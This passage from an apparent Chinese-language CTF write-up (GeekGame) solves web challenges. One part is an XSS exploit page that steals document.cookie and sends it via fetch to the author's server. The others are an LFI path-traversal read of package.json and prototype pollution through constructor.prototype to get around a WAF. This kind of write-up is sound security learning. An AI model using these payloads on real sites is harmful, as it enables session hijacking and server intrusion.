    <span class="k">if</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nx">text</span><span class="o">=</span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">).</span><span class="nx">substr</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">text</span><span class="p">.</span><span class="nx">lastIndexOf</span><span class="p">(</span><span class="dl">'</span><span class="s1">?</span><span class="dl">'</span><span class="p">)</span><span class="o">!==-</span><span class="mi">1</span><span class="p">)</span>
            <span class="nx">text</span><span class="o">=</span><span class="nx">text</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nx">text</span><span class="p">.</span><span class="nx">lastIndexOf</span><span class="p">(</span><span class="dl">'</span><span class="s1">?</span><span class="dl">'</span><span class="p">));</span> <span class="c1">// fuck wechat '#param?nsukey=...'</span>
        <span class="k">this</span><span class="p">.</span><span class="nx">setState</span><span class="p">({</span>
            <span class="na">search_text</span><span class="p">:</span> <span class="nx">text</span><span class="p">,</span>
        <span class="p">},</span> <span class="p">()</span><span class="o">=&gt;</span><span class="p">{</span>
            <span class="k">this</span><span class="p">.</span><span class="nx">on_keypress</span><span class="p">({</span><span class="na">key</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Enter</span><span class="dl">'</span><span class="p">});</span>
        <span class="p">});</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">//（省略）</span>

<span class="nx">on_keypress</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">key</span><span class="o">===</span><span class="dl">'</span><span class="s1">Enter</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nx">flag_res</span><span class="o">=</span><span class="nx">flag_re</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">search_text</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">flag_res</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">flag_res</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="p">{</span>
                <span class="nx">localStorage</span><span class="p">[</span><span class="nx">flag_res</span><span class="p">[</span><span class="mi">1</span><span class="p">]]</span><span class="o">=</span><span class="nx">flag_res</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
                <span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">Set Flag </span><span class="dl">'</span><span class="o">+</span><span class="nx">flag_res</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="dl">'</span><span class="s1">=</span><span class="dl">'</span><span class="o">+</span><span class="nx">flag_res</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">+</span><span class="dl">'</span><span class="se">\n</span><span class="s1">You may need to refresh this webpage.</span><span class="dl">'</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="k">delete</span> <span class="nx">localStorage</span><span class="p">[</span><span class="nx">flag_res</span><span class="p">[</span><span class="mi">1</span><span class="p">]];</span>
                <span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">Clear Flag </span><span class="dl">'</span><span class="o">+</span><span class="nx">flag_res</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="dl">'</span><span class="se">\n</span><span class="s1">You may need to refresh this webpage.</span><span class="dl">'</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="kd">const</span> <span class="nx">mode</span><span class="o">=</span><span class="k">this</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">search_text</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="dl">'</span><span class="s1">#</span><span class="dl">'</span><span class="p">)</span> <span class="p">?</span> <span class="dl">'</span><span class="s1">single</span><span class="dl">'</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">search</span><span class="dl">'</span><span class="p">;</span>
        <span class="k">this</span><span class="p">.</span><span class="nx">set_mode</span><span class="p">(</span><span class="nx">mode</span><span class="p">,</span><span class="k">this</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">search_text</span><span class="o">||</span><span class="dl">''</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>可以知道，如果在 URL 上动手脚，localStorage 是被立刻设置的——它可能比 <code class="language-plaintext highlighter-rouge">check_fix()</code> 早或者晚，但是肯定比更新 localStorage 早（500 毫秒可以干很多事情了）。</p>

<p>并且，XSS bot 无法处理 <code class="language-plaintext highlighter-rouge">alert()</code>，如果直接把这样的 payload 打进去，会抛出异常。所以我们需要一台有公网 IP 的服务器，然后用 <code class="language-plaintext highlighter-rouge">&lt;iframe&gt;</code> 来干坏事。</p>

<p>首先，<code class="language-plaintext highlighter-rouge">&lt;iframe&gt;</code> 可以确保里面的东西不随便弹框：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"a"</span> <span class="na">height=</span><span class="s">600</span> <span class="na">width=</span><span class="s">600</span> <span class="na">sandbox=</span><span class="s">"allow-scripts allow-same-origin"</span> <span class="na">src=</span><span class="s">"https://prob15-qkuhole.geekgame.pku.edu.cn/hole/"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</code></pre></div></div>

<p>这里允许 <code class="language-plaintext highlighter-rouge">allow-scripts allow-same-origin</code> 以保证正常运行（毕竟我们自己不担心被攻击），这种设置下 <code class="language-plaintext highlighter-rouge">&lt;iframe&gt;</code> 里面的东西是弹不出对话框的。最开始的时候，可能会尝试从外面的 JS 控制里面的元素，但是因为同源策略的问题，这样是不行的。要思考一下怎么做：</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">&lt;iframe&gt;</code> 加载带有我们 payload 的网页。</li>
  <li>在 localStorage 更新后、<code class="language-plaintext highlighter-rouge">fetch</code> 到更新前刷新 <code class="language-plaintext highlighter-rouge">&lt;iframe&gt;</code>。</li>
  <li>刷新之后我们的 payload 就能在 1ms 之后执行，之后再更新 localStorage 就和我们没关系了。</li>
</ol>

<p>怎么实现刷新？要注意的是我们摸不到 <code class="language-plaintext highlighter-rouge">&lt;iframe&gt;</code> 里面的 <code class="language-plaintext highlighter-rouge">window.reload()</code>，但是外面的脚本有权限设置 <code class="language-plaintext highlighter-rouge">src</code> 属性，设置成 <code class="language-plaintext highlighter-rouge">about:blank</code> 之后再改回来，就相当于刷新了。</p>

<p>基于这个思想，我的第一版 payload 大致长这样：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;title&gt;</span>Welcome to caddy!<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;style&gt;</span>
    <span class="nt">body</span> <span class="p">{</span>
        <span class="nl">width</span><span class="p">:</span> <span class="m">35em</span><span class="p">;</span>
        <span class="nl">margin</span><span class="p">:</span> <span class="m">0</span> <span class="nb">auto</span><span class="p">;</span>
        <span class="nl">font-family</span><span class="p">:</span> <span class="n">Tahoma</span><span class="p">,</span> <span class="n">Verdana</span><span class="p">,</span> <span class="n">Arial</span><span class="p">,</span> <span class="nb">sans-serif</span><span class="p">;</span>
    <span class="p">}</span>
<span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
	<span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"a"</span> <span class="na">height=</span><span class="s">600</span> <span class="na">width=</span><span class="s">600</span> <span class="na">sandbox=</span><span class="s">"allow-scripts allow-same-origin"</span> <span class="na">src=</span><span class="s">"https://prob15-qkuhole.geekgame.pku.edu.cn/hole/#//setflag%20APPSWITCHER_ITEMS={%22switcher_2%22:{%22bar%22:[[%22hole%22,%22树洞%22,%22#%22,%22#%22,null,false]],%22dropdown%22:[[%22homepage%22,%22客户端%22,%22#%22,%22#%22,null,false]],%22fix%22:{%22hole%22:%22console.log('hello'+document.cookie);%22}}}"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
<span class="nt">&lt;h1&gt;</span>Welcome to caddy!<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;p&gt;</span>If you see this page, the nginx web server is successfully uninstalled and
not working. Further configuration is not required.<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>For online documentation and support please refer to
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"http://nginx.org/"</span><span class="nt">&gt;</span>nginx.org<span class="nt">&lt;/a&gt;</span>.<span class="nt">&lt;br/&gt;</span>
Commercial support is available at
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"http://nginx.com/"</span><span class="nt">&gt;</span>nginx.com<span class="nt">&lt;/a&gt;</span>.<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;em&gt;</span>Just Kidding.<span class="nt">&lt;/em&gt;&lt;/p&gt;</span>
		<span class="nt">&lt;script&gt;</span>
			<span class="nx">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">a</span><span class="dl">"</span><span class="p">).</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">about:blank</span><span class="dl">"</span><span class="p">;</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">a</span><span class="dl">"</span><span class="p">).</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://prob15-qkuhole.geekgame.pku.edu.cn</span><span class="dl">"</span><span class="p">},</span> <span class="mi">500</span><span class="p">)</span>
		<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>（不要问我为什么文件内容这么生草，我是拿自己机器的 index.html 上面改的）</p>

<p>但是，在 console 里看不到 cookie，明明 localStorage 都能读！为什么？</p>

<p><a href="https://blog.heroku.com/chrome-changes-samesite-cookie">https://blog.heroku.com/chrome-changes-samesite-cookie</a>:</p>

<blockquote>
  <p>As previously stated, Google Chrome will stop sending third-party cookies in cross-site requests unless the cookies are secured and flagged using an IETF standard called SameSite. In other words, the content from b.com (images, iframe, etc.) on a.com’s page will no longer be able to access b.com’s cookies unless those cookies are secured and flagged appropriately.</p>
</blockquote>

<p>这是在 Chrome 80+ 之后的变化。从此之后，直接设置的 cookie 的 <code class="language-plaintext highlighter-rouge">SameSite</code> 默认是 <code class="language-plaintext highlighter-rouge">Lax</code>，不能在嵌入为 <code class="language-plaintext highlighter-rouge">iframe</code> 的页面里面读取。</p>

<p>小饼干😭我的小饼干😭</p>

<p>不过 Lax 还是留了一点小口子的：</p>

<blockquote>
  <p>Unlike None where cookies are always sent, Lax cookies are only sent on same-site request like Strict. However, Lax allows top-level navigation access with a safe HTTP method, like HTTP GET. The cookie will not be sent with cross-domain POST requests or when loading the site in a cross-origin frame, but it will be sent when you navigate to the site via a standard top-level <code class="language-plaintext highlighter-rouge">&lt;a href=...&gt;</code> link.</p>
</blockquote>

<p>那么的话，刷新可以这么实现：网页上先放一个 <code class="language-plaintext highlighter-rouge">&lt;a&gt;</code> 指向 Q 小树洞，然后 500ms 后先设置 <code class="language-plaintext highlighter-rouge">src</code>（不让 <code class="language-plaintext highlighter-rouge">&lt;iframe&gt;</code> 继续加载），然后模拟点击这个 <code class="language-plaintext highlighter-rouge">&lt;a&gt;</code>，就可以绕过这个限制。</p>

<p>最终的 payload 在 <a href="https://static.taoky.moe/zzhtql.html">https://static.taoky.moe/zzhtql.html</a>，内容如下：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;title&gt;</span>Welcome to caddy!<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;style&gt;</span>
    <span class="nt">body</span> <span class="p">{</span>
        <span class="nl">width</span><span class="p">:</span> <span class="m">35em</span><span class="p">;</span>
        <span class="nl">margin</span><span class="p">:</span> <span class="m">0</span> <span class="nb">auto</span><span class="p">;</span>
        <span class="nl">font-family</span><span class="p">:</span> <span class="n">Tahoma</span><span class="p">,</span> <span class="n">Verdana</span><span class="p">,</span> <span class="n">Arial</span><span class="p">,</span> <span class="nb">sans-serif</span><span class="p">;</span>
    <span class="p">}</span>
<span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
	<span class="c">&lt;!--&lt;iframe id="a" height=600 width=600 sandbox="allow-scripts allow-same-origin" src="https://prob15-qkuhole.geekgame.pku.edu.cn/hole/#//setflag%20hole_config={%22background_img%22:%22javascript:alert(1)%22,%22background_color%22:%22#113366%22,%22pressure%22:false,%22easter_egg%22:true,%22color_scheme%22:%22default%22}"&gt;&lt;/iframe&gt;--&gt;</span>
	<span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"a"</span> <span class="na">height=</span><span class="s">600</span> <span class="na">width=</span><span class="s">600</span> <span class="na">sandbox=</span><span class="s">"allow-scripts allow-same-origin"</span> <span class="na">src=</span><span class="s">"https://prob15-qkuhole.geekgame.pku.edu.cn/hole/#//setflag%20APPSWITCHER_ITEMS={%22switcher_2%22:{%22bar%22:[[%22hole%22,%22树洞%22,%22#%22,%22#%22,null,false]],%22dropdown%22:[[%22homepage%22,%22客户端%22,%22#%22,%22#%22,null,false]],%22fix%22:{%22hole%22:%22console.log(document.cookie);fetch('https://static.taoky.moe/'+document.cookie);%22}}}"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
	<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'https://prob15-qkuhole.geekgame.pku.edu.cn/hole/'</span> <span class="na">id=</span><span class="s">"b"</span><span class="nt">&gt;</span>Welcome to Q 小树洞！<span class="nt">&lt;/a&gt;</span>
<span class="nt">&lt;h1&gt;</span>Welcome to caddy!<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;p&gt;</span>If you see this page, the nginx web server is successfully uninstalled and
not working. Further configuration is not required.<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>For online documentation and support please refer to
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"http://nginx.org/"</span><span class="nt">&gt;</span>nginx.org<span class="nt">&lt;/a&gt;</span>.<span class="nt">&lt;br/&gt;</span>
Commercial support is available at
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"http://nginx.com/"</span><span class="nt">&gt;</span>nginx.com<span class="nt">&lt;/a&gt;</span>.<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;em&gt;</span>Just Kidding.<span class="nt">&lt;/em&gt;&lt;/p&gt;</span>
		<span class="nt">&lt;script&gt;</span>
			<span class="c1">// setTimeout(() =&gt; {document.getElementById("a").src = "about:blank"; document.getElementById("a").src = "https://prob15-qkuhole.geekgame.pku.edu.cn"}, 500)</span>
			<span class="nx">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">a</span><span class="dl">"</span><span class="p">).</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">about:blank</span><span class="dl">"</span><span class="p">;</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">b</span><span class="dl">"</span><span class="p">).</span><span class="nx">click</span><span class="p">()},</span> <span class="mi">500</span><span class="p">)</span>
			<span class="c1">// setInterval(() =&gt; {document.title = document.getElementById("a").contentWindow.title},1000)</span>
		<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">fetch</code> 那里改成自己的机器，<code class="language-plaintext highlighter-rouge">tail -f</code> 看一下 access log 就行了。</p>

<p>小饼干🤤我的小饼干🤤</p>

<h2 id="flag即服务">flag即服务</h2>

<p><em>（第三小题未完成）</em></p>

<h3 id="零获得代码">零·获得代码</h3>

<p>首先可以猜到肯定又有 LFI 了。不带参数访问 <code class="language-plaintext highlighter-rouge">/api</code> 会抛出异常：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Error: EISDIR: illegal operation on a directory, read
    at Object.readSync (fs.js:617:3)
    at tryReadSync (fs.js:382:20)
    at Object.readFileSync (fs.js:419:19)
    at /usr/src/app/node_modules/jsonaas-backend/index.js:56:19
    at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)
    at next (/usr/src/app/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/usr/src/app/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)
    at /usr/src/app/node_modules/express/lib/router/index.js:281:22
    at param (/usr/src/app/node_modules/express/lib/router/index.js:354:14)
</code></pre></div></div>

<p>几乎可以肯定是 LFI 了。直接浏览器里 <code class="language-plaintext highlighter-rouge">../</code> 是不行的，把 <code class="language-plaintext highlighter-rouge">/</code> 改成 <code class="language-plaintext highlighter-rouge">%2F</code> 就好了。因为是 node.js，所以肯定要康康 <code class="language-plaintext highlighter-rouge">package.json</code> (<a href="https://prob11-placeholder.geekgame.pku.edu.cn/api/..%2F/package.json">https://prob11-placeholder.geekgame.pku.edu.cn/api/..%2F/package.json</a>)</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="s2">"demo-server"</span><span class="p">,</span><span class="nl">"version"</span><span class="p">:</span><span class="s2">"1.0.0"</span><span class="p">,</span><span class="nl">"description"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="nl">"scripts"</span><span class="p">:{</span><span class="nl">"start"</span><span class="p">:</span><span class="s2">"node --max-http-header-size=32768 start.js"</span><span class="p">},</span><span class="nl">"author"</span><span class="p">:</span><span class="s2">"You"</span><span class="p">,</span><span class="nl">"license"</span><span class="p">:</span><span class="s2">"WTFPL"</span><span class="p">,</span><span class="nl">"dependencies"</span><span class="p">:{</span><span class="nl">"jsonaas-backend"</span><span class="p">:</span><span class="s2">"https://geekgame.pku.edu.cn/static/super-secret-jsonaas-backend-1.0.1.tgz"</span><span class="p">}}</span><span class="w">
</span></code></pre></div></div>

<p>下载 <code class="language-plaintext highlighter-rouge">super-secret-jsonaas-backend-1.0.1.tgz</code>，解压，可以看到 flag0:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nx">FLAG0</span><span class="o">!==</span><span class="s2">`flag{</span><span class="p">${</span><span class="mf">0.1</span><span class="o">+</span><span class="mf">0.2</span><span class="p">}</span><span class="s2">}`</span><span class="p">)</span>
    <span class="k">return</span><span class="p">;</span>
</code></pre></div></div>

<p>结果是啥不用我说了吧.png</p>

<p>另外，代码稍微修改一下就能在本地跑，方便调试。</p>

<h3 id="壹开通会员">壹·开通会员</h3>

<p>第二小题需要读取 <code class="language-plaintext highlighter-rouge">FLAG1</code> 变量。尽管知道了 session secret，但是用不了，因为 <code class="language-plaintext highlighter-rouge">express-session</code> 默认的值是保存在服务器内存里的，空欢喜一场。从 <code class="language-plaintext highlighter-rouge">waf()</code> 来看，有可能是原型链污染。「激活」的逻辑如下：</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/activate</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">code</span><span class="o">===</span><span class="nx">FLAG1</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">activated</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">activated</span><span class="p">)</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">`You have been activated. Activation code: </span><span class="p">${</span><span class="nx">FLAG1</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
    <span class="k">else</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Wrong activation code :(</span><span class="dl">'</span><span class="p">);</span>
<span class="p">});</span>
</code></pre></div></div>

<p>我们的目标是让 <code class="language-plaintext highlighter-rouge">req.session.activated</code> 变成非空的一个东西。瞄一眼 <code class="language-plaintext highlighter-rouge">demo.json</code>:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Foo"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"age"</span><span class="p">:</span><span class="w"> </span><span class="mi">24</span><span class="p">,</span><span class="w">
    </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"student"</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Bar"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"age"</span><span class="p">:</span><span class="w"> </span><span class="mi">17</span><span class="p">,</span><span class="w">
    </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"monster"</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">age</code> 应该是满足要求的，所以 <code class="language-plaintext highlighter-rouge">in_path=1/age</code>，之后是 <code class="language-plaintext highlighter-rouge">output</code> 的处理：</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">output</span> <span class="o">=</span> <span class="p">{};</span>
<span class="c1">//（省略）</span>
<span class="kd">let</span> <span class="nx">cur</span> <span class="o">=</span> <span class="nx">output</span><span class="p">;</span>
<span class="k">for</span><span class="p">(</span><span class="kd">let</span> <span class="nx">term</span> <span class="k">of</span> <span class="nx">out_path</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">out_path</span><span class="p">.</span><span class="nx">length</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">term</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">'</span><span class="s1">_</span><span class="dl">'</span><span class="p">)</span><span class="o">!==-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Bad parameter!</span><span class="dl">'</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="c1">// no eval for out_path :)</span>
    <span class="cm">/*
    if(eval_mode &amp;&amp; /^\([^a-zA-Z"',;]+\)$/.test(term))
        term = safe_eval(term);
    */</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">cur</span><span class="p">[</span><span class="nx">term</span><span class="p">]</span><span class="o">===</span><span class="kc">undefined</span><span class="p">)</span>
        <span class="nx">cur</span><span class="p">[</span><span class="nx">term</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
    <span class="nx">cur</span> <span class="o">=</span> <span class="nx">cur</span><span class="p">[</span><span class="nx">term</span><span class="p">];</span>
<span class="p">}</span>
<span class="nx">cur</span><span class="p">[</span><span class="nx">out_path</span><span class="p">[</span><span class="nx">out_path</span><span class="p">.</span><span class="nx">length</span><span class="o">-</span><span class="mi">1</span><span class="p">]]</span> <span class="o">=</span> <span class="nx">data</span><span class="p">;</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">data</code> 是 <code class="language-plaintext highlighter-rouge">in_path</code> 过滤后的结果。我们的目标是让最后原型被赋值为 <code class="language-plaintext highlighter-rouge">24</code>。先在 REPL 里头试试：</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>node
Welcome to Node.js v17.0.1.
Type <span class="s2">".help"</span> <span class="k">for </span>more information.
<span class="o">&gt;</span> session <span class="o">=</span> <span class="o">{}</span>
<span class="o">{}</span>
<span class="o">&gt;</span> <span class="o">{}[</span><span class="s1">'__proto__'</span><span class="o">][</span><span class="s1">'activated'</span><span class="o">]</span> <span class="o">=</span> 24
24
<span class="o">&gt;</span> session.activated
24
</code></pre></div></div>

<p>但是这个 payload 用不了，因为会检查有没有 <code class="language-plaintext highlighter-rouge">_</code>，而且不好绕过。那换一个：</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>node
Welcome to Node.js v17.0.1.
Type <span class="s2">".help"</span> <span class="k">for </span>more information.
<span class="o">&gt;</span> session <span class="o">=</span> <span class="o">{}</span>
<span class="o">{}</span>
<span class="o">&gt;</span> <span class="o">{}[</span><span class="s1">'constructor'</span><span class="o">]</span>
<span class="o">[</span>Function: Object]
<span class="o">&gt;</span> <span class="o">{}[</span><span class="s1">'constructor'</span><span class="o">][</span><span class="s1">'prototype'</span><span class="o">]</span>
<span class="o">[</span>Object: null prototype] <span class="o">{}</span>
<span class="o">&gt;</span> <span class="o">{}[</span><span class="s1">'constructor'</span><span class="o">][</span><span class="s1">'prototype'</span><span class="o">][</span><span class="s1">'activated'</span><span class="o">]</span> <span class="o">=</span> 24
24
<span class="o">&gt;</span> session.activated
24
</code></pre></div></div>

<p>最后一个问题是：怎么绕过 <code class="language-plaintext highlighter-rouge">waf()</code>？先看一下逻辑：</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">waf</span><span class="p">(</span><span class="nx">str</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">for</span><span class="p">(</span><span class="kd">let</span> <span class="nx">bad_name</span> <span class="k">of</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">getOwnPropertyNames</span><span class="p">(({}).</span><span class="nx">__proto__</span><span class="p">))</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">str</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">bad_name</span><span class="p">)</span><span class="o">!==-</span><span class="mi">1</span><span class="p">)</span>
            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// app.get('/api/:path(*)', (req, res)=&gt;{</span>
<span class="kd">let</span> <span class="nx">path</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">data/</span><span class="dl">'</span><span class="o">+</span><span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">path</span><span class="p">;</span>
<span class="kd">let</span> <span class="nx">in_path</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">in_path</span><span class="o">||</span><span class="dl">''</span><span class="p">;</span>
<span class="kd">let</span> <span class="nx">out_path</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">out_path</span><span class="o">||</span><span class="dl">''</span><span class="p">;</span>
<span class="kd">let</span> <span class="nx">prefix</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">prefix</span> <span class="p">?</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">prefix</span><span class="o">+</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">)</span> <span class="p">:</span> <span class="dl">''</span><span class="p">;</span>
<span class="kd">let</span> <span class="nx">eval_mode</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">eval_enabled</span><span class="o">===</span><span class="mi">1</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="nx">waf</span><span class="p">(</span><span class="nx">in_path</span><span class="p">)</span> <span class="o">||</span> <span class="nx">waf</span><span class="p">(</span><span class="nx">out_path</span><span class="p">)</span> <span class="o">||</span> <span class="nx">waf</span><span class="p">(</span><span class="nx">prefix</span><span class="p">))</span> <span class="p">{</span>
